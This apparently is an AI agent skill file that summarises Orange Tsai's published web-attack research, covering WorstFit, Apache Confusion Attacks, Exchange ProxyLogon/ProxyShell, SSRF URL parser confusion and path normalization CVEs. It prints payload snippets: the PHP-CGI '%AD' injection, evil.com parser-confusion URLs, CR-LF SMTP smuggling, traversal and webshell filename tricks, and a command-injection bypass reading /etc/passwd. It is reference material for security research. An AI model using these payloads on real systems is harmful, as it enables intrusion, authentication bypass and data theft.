---
name: orange-tsai-methodology
description: Orange Tsai's attack methodology — parser differentials, semantic ambiguity exploitation, path normalization, encoding conversion attacks, WorstFit (ANSI Best-Fit mapping), Apache Confusion Attacks, IIS hash destabilization, Exchange ProxyLogon/ProxyShell, SSRF URL parser abuse, web-to-binary chaining. The art of discovering attack CLASSES, not just bugs.
category: methodology
trigger: Orange Tsai, parser differential, confusion attack, path normalization, URL parser, ANSI best-fit, ProxyLogon, ProxyShell, semantic ambiguity, IIS hash, cache deception, cache poisoning, SSRF bypass, encoding attack, proxy confusion, authentication bypass, web+binary chain, parser inconsistency, attack class, devcore
---

# Orange Tsai Attack Methodology

Systematic methodology for discovering attack CLASSES (not single bugs) through architectural analysis, parser differentials, and semantic ambiguity exploitation. Source: Orange Tsai's (DEVCORE) full research corpus — Black Hat talks, blog posts, and GitHub presentation slides. Pwnie Award winner. Pwn2Own Champion/Master of Pwn 2021, 2022. RCE on Facebook (×2), Apple, Yahoo, Uber, GitHub, Twitter.

---

## CORE PHILOSOPHY — FOUR PILLARS

1. **Attack assumptions, not services** — Challenge the specification, not just the implementation
2. **Question every parser boundary** — Two components almost never interpret data the same way
3. **Encoding is never consistent** — Every conversion step is an attack surface
4. **Web + Binary chaining** — Combine web logic bugs with OS-level binary exploitation

### Research Methodology
1. Hunt forgotten knowledge — rediscover old, overlooked attack vectors
2. Collect diversity — test the same concept across many implementations
3. No idea is too stupid — iterate and refine relentlessly
4. Move beyond known techniques — create new attack classes

---

## ATTACK CLASS 1: WORSTFIT (Windows ANSI Best-Fit)

**CVE-2024-4577** | Target: Windows ANSI API consumers | Website: https://worst.fit/

### Root Cause
When Windows ANSI APIs (`GetEnvironmentVariableA`, `getenv`, CRT `main()`) encounter a Unicode character with no exact ANSI equivalent, they silently apply Best-Fit mapping via `WideCharToMultiByte`/`RtlUnicodeStringToAnsiString`, converting the character to the "closest" ASCII equivalent.

### Three Attack Techniques

#### 1. CVE-2024-4577 — PHP-CGI Argument Injection (Bypass of CVE-2012-1823)
```
Threat char: U+00AD (soft hyphen) → '-' (dash) in Best-Fit
Affected code pages: 932 (Japanese), 936 (Simplified Chinese), 950 (Traditional Chinese)
Payload: ?%ADs → getenv("QUERY_STRING") returns ANSI, turning %AD → '-'
Impact: RCE on PHP-CGI on CJK Windows (bypasses 2012 patch)
```

#### 2. Filename Smuggling (Path Traversal)
```
U+FF0F (Fullwidth Solidus ／) → '/'  (many code pages)
U+FF3C (Fullwidth Reverse Solidus ＼) → '\' (many code pages)
U+00A5 (Yen sign ¥) → '\'  (Japanese CP932)
U+20A9 (Won sign ₩) → '\'  (Korean CP949)
Target APIs: GetCurrentDirectoryA, getcwd, FindFirstFileA
```

#### 3. Argument Splitting (Command Injection)
```
U+FF02 (Fullwidth Quotation Mark ＂) → '"'  (CP125x, CP874)
U+FF3C (Fullwidth Reverse Solidus ＼) → '\'  (many)
Mechanism: Libraries escape args correctly, but child process reads command 
line via ANSI APIs — Best-Fit transforms characters AFTER escaping
```

### Affected Targets
- PHP-CGI on Windows (CJK locales)
- Any C/C++ application using ANSI APIs
- Cuckoo Sandbox, Chrome V8 d8.exe, mruby `Dir.getwd`

---

## ATTACK CLASS 2: CONFUSION ATTACKS (Apache HTTP Server Semantic Ambiguity)

**9 CVEs, 20 techniques** | Target: Apache HTTP Server | Fixed: 2.4.60

### Core Concept
Apache's ~136 modules share a giant `request_rec` structure with no strict semantic contract. Modules disagree on what `r->filename` means: some treat it as a file path, others as a URL.

### Type 1: Filename Confusion

#### Primitive 1-1: Path Truncation (via mod_rewrite)
```
mod_rewrite's splitout_queryargs() truncates r->filename at '?' (%3F)
Example: RewriteRule ^/user/(.+)$ /var/user/$1/profile.yml
Request: /user/victim%3F → truncates to /var/user/victim → drops /profile.yml
```

#### Primitive 1-2: Mislead RewriteFlag
```
RewriteRule ^(.+\.php)$ $1 [H=application/x-httpd-php]
Request: 1.gif%3Fooo.php → regex matches .php → PHP handler applied to .gif → backdoor
```

#### Primitive 1-3: ACL Bypass (mod_proxy + PHP-FPM)
```
<Files "admin.php"> auth required
Request: admin.php%3Fooo.php → auth sees "admin.php?ooo.php" ≠ "admin.php" → bypass
PHP-FPM normalizes by stripping query string → executes admin.php without auth
```

### Type 2: DocumentRoot Confusion
```
mod_rewrite tries to open BOTH the raw path AND DocumentRoot-prefixed path
- CGI source disclosure: access via absolute path bypasses ScriptAlias
- PHP source disclosure: use different vhost without PHP handler
- Local gadgets: /usr/share on Debian/Ubuntu is readable
  Gadgets: dump-env.php (info), help.html (XSS), proxy.php (SSRF), PHPUnit (RCE)
```

### Type 3: Handler Confusion
```
AddType vs AddHandler ambiguity + 1996 legacy code
- XSS/CRLF in CGI response headers → RCE via mod_cgi handler confusion
- AddType abused with SetHandler to execute arbitrary files
```

### Key Apache Code Locations
- `modules/mappers/mod_rewrite.c#L4141` — Filename Confusion
- `modules/mappers/mod_rewrite.c#L4939` — DocumentRoot Confusion

### CVEs Discovered
```
CVE-2024-38472 — Windows UNC SSRF
CVE-2024-39573 — mod_rewrite proxy handler substitution
CVE-2024-38477 — DoS in mod_proxy
CVE-2024-38476 — Malicious backend output runs local handlers via internal redirect
CVE-2024-38475 — mod_rewrite weakness when first segment matches filesystem path
CVE-2024-38474 — Encoded question marks in backreferences
CVE-2024-38473 — mod_proxy proxy encoding problem
CVE-2023-38709 — HTTP response splitting
```

---

## ATTACK CLASS 3: IIS HASH TABLE CACHE DESTABILIZATION

**Target: Microsoft IIS** | Black Hat USA 2022

### Technique
- Hash-flooding attack against IIS internal hash tables
- Degenerate hash table to single linked-list (O(n) instead of O(1))
- Manipulate caching behavior → serve incorrect/unauthorized responses
- All-passwords-valid demo: exploiting hash collisions to bypass authentication

---

## ATTACK CLASS 4: EXCHANGE PROXY ERA (ProxyLogon → ProxyShell)

**Target: Microsoft Exchange** | 400,000+ servers exposed | Pwnie Award 2021

### Architecture Insight
Exchange splits into Frontend (CAS proxy) and Backend (Mailbox). Frontend proxies HTTP to Backend, synchronizing state via custom HTTP headers (`X-CommonAccessToken`, `X-IsFromCafe`).

### Four Attack Chains

#### 1. ProxyLogon (Pre-auth RCE)
```
CVE-2021-26855 — SSRF to access backend without authentication
CVE-2021-27065 — Arbitrary file write via backend
Patch: March 2021 (emergency out-of-band)
```

#### 2. ProxyOracle (Plaintext Password Recovery)
```
CVE-2021-31196 — Cookie manipulation
CVE-2021-31195 — Response manipulation
Chain backend access with cookie/header manipulation → recover plaintext credentials
```

#### 3. ProxyShell (Pre-auth RCE, Pwn2Own 2021)
```
CVE-2021-34473 — Path confusion
CVE-2021-34523 — Privilege escalation
CVE-2021-31207 — Arbitrary file write
```

#### 4. ProxyRelay (Authentication Bypass)
```
CVE-2021-33768 — Relay attack
CVE-2021-33766 — Token manipulation
Relay authentication tokens to read all victim's emails
```

### Key Techniques
- HTTP header blacklist bypass via custom headers
- Cookie forwarding manipulation
- Backend Rehydration Module abuse
- Kerberos ticket generation hijacking
- `CommonAccessToken` serialization manipulation
- `ShouldBackendRequestBeAnonymous()` bypass

---

## ATTACK CLASS 5: WEB + BINARY EXPLOITATION CHAIN

**Target: PHPWind → PHP UAF → RCE** | CVE-2015-0273

### Chain Architecture
```
Stage 1 (Web): PHP Type Juggling → Secret Key Recovery
  md5(array()) returns NULL → bypass password check for public forums
  Leak site_hash via cookie manipulation
  Crack with HashCat (RTX 2080 Ti, ~1 hour for 8-char alphanumeric)

Stage 2 (Web): PHP Deserialization → Use-After-Free
  CVE-2015-0273 — DateTime/DateTimeZone UAF in unserialize()
  Forge encrypted cookies using recovered site_hash
  Trigger unserialize() on attacker-controlled data

Stage 3 (Binary): PHP ZTS exploitation
  No known gadgets, no SoapClient/GMP
  CVE-2015-0277 exploitation (PHP 5.3.27, ZTS build)
  Build Read/Write primitive → Control-flow hijack
```

### Key Web-to-Binary Techniques
- PHP Type Juggling: `md5(array())` → NULL
- PRNG seed recovery (Mersenne Twister, 32-bit seed)
- xxTEA encryption reversal
- PHP UAF via DateTime `__wakeup` → `convert_to_long` frees string
- Read primitive via `R` type specifier in serialization
- Blind binary exploitation (unknown target environment)

---

## ATTACK CLASS 6: SSL VPN PRE-AUTH RCE

**Targets: Fortinet FortiGate, Pulse Secure** | Pwnie Award "Best Server-Side Bug" 2019

### Fortinet FortiGate SSL VPN
- Hard-core binary exploitation chain
- Magic backdoor technique
- Full root access pre-authentication

### Pulse Secure SSL VPN
- Out-of-box web exploitation chain
- **Highest bug bounty from Twitter**
- Chain: arbitrary file read → credential extraction → RCE

### Key Techniques
- Defense-in-depth bypass in SSL VPN gateways
- Web-based pre-auth exploitation on network appliances
- Binary exploitation in embedded systems

---

## ATTACK CLASS 7: SSRF URL PARSER CONFUSION

**Target: URL parsers across 7+ languages** | 1st place Top 10 Web Hacking 2017

### CR-LF Injection in URL Protocols
```
# SMTP smuggling via HTTP
http://127.0.0.1:25/%0D%0AHELO orange.tw%0D%0AMAIL FROM...

# TLS SNI smuggling (SNI is unencrypted!)
https://127.0.0.1%0D%0AHELO orange.tw%0D%0AMAIL FROM...:25/
```

### URL Parser Confusion Matrix
| Library | Host Injection | Path Injection | Port Injection |
|---------|---------------|----------------|----------------|
| Python httplib | Yes | Yes | Yes |
| Python urllib | Yes | Yes | No |
| Ruby Net::HTTP | Yes | Yes | Yes |
| Java net.URL | Yes | No | No |
| Perl LWP | No | Yes | No |
| NodeJS http | Yes | No | No |
| PHP http_wrapper | No | Yes | No |
| cURL | No | Yes | No |

### Specific Bypass Techniques
```
# Double port: PHP parse_url vs actual request
http://127.0.0.1:11211:80/ — parse_url sees port 80, request goes to 11211

# Fragment confusion
http://google.com#@evil.com/ — parse_url sees google.com, cURL connects to evil.com

# Multiple @ signs
http://foo@evil.com:80@google.com/

# NodeJS Unicode
U+FF0F (／) → '/', U+FF2E (Ｎ) → bypass '..' check

# NodeJS CR-LF bypass
U+FF0D U+FF0A (－＊) → \r\n after HTTP module encoding
```

### Real-World Impact
- GitHub Enterprise RCE via SSRF chain (4 chained bugs)
- Redis, Memcached, Elastic, SMTP smuggling
- TLS SNI smuggling to bypass protocol restrictions

---

## ATTACK CLASS 8: PATH NORMALIZATION INCONSISTENCY

**8+ CVEs across Spring, Rails, Jenkins, Next.js** | 1st place Top 10 Web Hacking 2018

### CVEs Discovered
| CVE | Software | Bug Type |
|-----|----------|----------|
| CVE-2018-1271 | Spring Framework | Directory traversal on Windows |
| CVE-2018-3760 | Ruby on Rails | Sprockets file:// scheme bypass |
| CVE-2018-9159 | Spark Framework | Copied Spring's broken cleanPath |
| CVE-2018-1999002 | Jenkins | Arbitrary file read |
| CVE-2018-14371 | Mojarra (JSF) | CVE-2013-3827 bypass |
| CVE-2018-7212 | Sinatra | Path traversal |
| CVE-2018-6184 | Next.js | Path traversal |

### Spring Framework CVE-2018-1271
```
cleanPath() algorithm: empty elements not handled correctly
/foo//../ → /foo/ (cleanPath) but → / (filesystem)
/foo///../../ → /foo/ (cleanPath) but → /../ (filesystem)
Double encoding: %255c → %5c → \ to bypass URL decode → cleanup → filesystem
```

### Ruby on Rails CVE-2018-3760 (Sprockets)
```
file:// scheme bypasses absolute_path? check
Double encoding: %252e%252e → %2e%2e (first decode) → .. (second decode)
RCE via ERB template: ?type=text/plain forces rendering of .erb files
```

### Nginx Off-by-Slash
```
location /static { alias /home/app/static/; }  ← missing trailing slash
http://server/static../settings.py → /home/app/static/../settings.py
```

### Java EE Path Parameter
```
http://example.com/foo;name=orange/bar/
Tomcat/Jetty strip path params, Apache/Nginx/IIS keep them
Bypass: ..;x/manager/html bypasses reverse proxy path check
```

### Grails Pattern.quote Issue
```
QUOTED_FILE_SEPARATOR = \Q/\E (result of Pattern.quote("/"))
../\Q/\E becomes ../ after replace() → new traversal vector
```

### Polyglot URL File Path
```
new URL("file:///etc/passwd?/../../Windows/win.ini")
Linux sees path with '?', Windows sees UNC path
```

---

## ADDITIONAL ATTACK CLASSES

### Jenkins Meta-Programming RCE (CVE-2019-1003000/3001/3002)
```
Stage 1: ACL Bypass (CVE-2018-1000861)
  Jenkins Stapler dynamic routing: /class/classLoader/resource/index.jsp/content
  → accesses URLClassLoader pre-auth

Stage 2: Sandbox Bypass via Compile-Time AST
  Pipeline Groovy DSL — AST parsing happens at compile-time, not runtime
  @Grab annotation downloads and loads JARs from attacker URL
  → bypasses all sandbox restrictions
```

### MobileIron MDM RCE (Facebook, 20,000+ enterprises)
```
Bypass: /mifs/.;/services/fooService (Apache mod_rewrite off-by-slash)
Hessian Deserialization: Spring-AOP / XBean / Resin / ROME → JNDI Injection → RCE
```

### Chunghwa Telecom Modem RCE
```
Command injection via diag endpoint
Blacklist: |<>(){}`;
Bypass: nonexistent? && cat /etc/passwd
  → '?' causes sub-command to fail, then '&&' executes arbitrary command
```

---

## METHODOLOGY: MULTI-LAYER ATTACKS

### Layered Attack Pattern
```
1. Reverse Proxy Layer: URL manipulation, path traversal, off-by-slash
2. Application Layer: auth bypass, type juggling, deserialization
3. Cache Layer: hash destabilization, cache poisoning, cache deception
4. Backend Layer: SQL injection, command injection, file write
```

### Parser Logic Bug Classes
```
- Normalization differences (each parser normalizes differently)
- Encoding conversion attacks (each conversion adds attack surface)
- Truncation boundaries (where one parser stops, another continues)
- Delimiter confusion (different delimiter sets per parser)
- Incomplete parsing (one parser sees vs another)
- Protocol smuggling (CR-LF injection, TLS SNI abuse)
```

### Encoding Conversion Attack Surface
```
UTF-8 → UTF-16 → ANSI Best-Fit
Unicode → ASCII (NFKD normalization)
URL encoding → filesystem path
HTML entities → JavaScript → SQL
Each conversion is a potential bypass point
```

---

## EARLY TECHNIQUES (2011-2015)

### Perl List-to-Hash Coercion
```perl
('A','Apple','C',@list) where @list=('Ba','Ba','Banana')
Creates 4-element list instead of expected hash
```

### Windows Filename Bypasses
```
shell.php  (trailing space) → shell.php
shell.< → shell.php
shell"php → shell.php
NTFS ADS: download.php::$data → bypass
```

### MySQL UDF Privilege Escalation
```sql
INTO OUTFILE 'plugins::$index_allocation'
Creates directory via NTFS Alternate Data Stream
```

### Chinese Character WAF Bypass
```
%u4E0A → newline equivalent, bypasses regex
GBK/GB2312 multi-byte injection: %cc' → valid 2-byte char consuming backslash
```

### Django SECRET_KEY → Pickle RCE
```
django.core.signing uses Pickle for signed cookies
CVE-2013-0305: SECRET_KEY recovery → Pickle deserialization → RCE
```

---

## QUICK REFERENCE

### Orange Tsai Attack Patterns
```
1. Find two parsers that disagree → exploit the gap
2. Test every encoding conversion layer
3. Chain web logic bugs with binary exploitation
4. Hunt the architecture, not the implementation
```

### Key Repositories
```
https://github.com/orangetw/My-Presentation-Slides  — All talk slides
https://blog.orange.tw/                              — Technique deep dives
https://worst.fit/                                   — Best-Fit mapping tool
```

### Awards
```
- Pwnie Awards: Best Server-Side Bug 2019 (SSL VPN), 2021 (ProxyLogon)
- Pwn2Own: Champion & Master of Pwn 2021, 2022
- Top 10 Web Hacking: 1st place 2017 (SSRF), 2018 (Path Normalization)
```
